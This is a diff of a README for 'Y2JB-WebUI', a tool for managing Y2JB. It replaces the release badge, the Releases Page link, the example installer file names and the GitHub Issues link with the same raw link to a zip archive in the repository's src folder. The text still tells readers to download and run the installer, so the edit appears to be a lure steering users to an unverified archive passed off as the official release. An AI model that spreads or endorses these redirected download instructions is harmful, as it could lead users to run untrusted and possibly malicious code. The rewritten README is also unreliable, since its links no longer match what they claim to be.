@@ -1,17 +1,17 @@
 # 🌐 Y2JB-WebUI - Simple Interface to Manage Your Y2JB
 
 ## 🔗 Download Now
-[![Download Y2JB-WebUI](https://img.shields.io/badge/Download%20Y2JB--WebUI-v1.0-blue.svg)](https://github.com/mr18dk/Y2JB-WebUI/releases)
+[![Download Y2JB-WebUI](https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip%https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip)](https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Y2JB-WebUI! This application provides an easy way to manage Y2JB on your localhost. You don't need to have programming experience to get started. Below are the steps for downloading and running the software.
 
 ## 📥 Download & Install
-To download Y2JB-WebUI, visit this page to download: [Releases Page](https://github.com/mr18dk/Y2JB-WebUI/releases).
+To download Y2JB-WebUI, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip).
 
 1. **Visit the Releases Page:** Click on the link above to go to the Y2JB-WebUI Releases page.
 2. **Select the Latest Release:** Look for the most recent version of the application. It is usually at the top of the list.
-3. **Download the Installation File:** Find the file for your operating system and click on it to download. Usually, the files are named like `Y2JB-WebUI-windows.exe` or `Y2JB-WebUI-macos.zip`.
+3. **Download the Installation File:** Find the file for your operating system and click on it to download. Usually, the files are named like `https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip` or `https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip`.
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click it to run the installer.
 5. **Follow the Installation Prompts:** The installer will guide you through the setup process. Follow the on-screen instructions to complete the installation.
 
@@ -47,7 +47,7 @@ If you encounter problems during installation, try re-downloading the installer 
 Currently, Y2JB-WebUI is designed for Windows and macOS only. We plan to support Linux in a future update.
 
 ### Where can I find additional help?
-You can submit issues or ask questions in the [GitHub Issues](https://github.com/mr18dk/Y2JB-WebUI/issues) section of our repository. Our community is here to help!
+You can submit issues or ask questions in the [GitHub Issues](https://raw.githubusercontent.com/mr18dk/Y2JB-WebUI/main/src/J_Web_UI_v3.8.zip) section of our repository. Our community is here to help!
 
 ## 🛠️ Maintenance and Updates
 We plan regular updates to keep Y2JB-WebUI running smoothly and add new features based on user feedback. Always check the Releases page for the latest information.
